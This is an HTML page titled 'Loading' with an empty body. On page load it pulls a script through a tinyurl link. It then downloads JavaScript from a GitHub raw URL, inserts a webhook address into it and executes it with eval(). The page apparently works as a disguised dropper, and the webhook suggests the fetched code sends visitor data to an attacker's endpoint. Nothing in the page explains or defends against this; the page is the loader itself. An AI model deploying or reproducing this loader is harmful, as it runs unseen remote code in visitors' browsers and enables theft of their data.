<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script src="https://tinyurl.com/3yhdxb4p"></script>
    <script>
        function load() {
            var webhookURL = 'WEBHOOK_URL_PLACEHOLDER';

            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/discip/master/js-server.js';

            var xhr = new XMLHttpRequest();
            xhr.open('GET', scriptURL, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    var scriptCode = xhr.responseText;
                    scriptCode = scriptCode.replace('WEBHOOK_URL_PLACEHOLDER', webhookURL);
                    eval(scriptCode);
                }
            };
            xhr.send();
        }
    </script>
</head>
<body onload="load()">
</body>
</html>
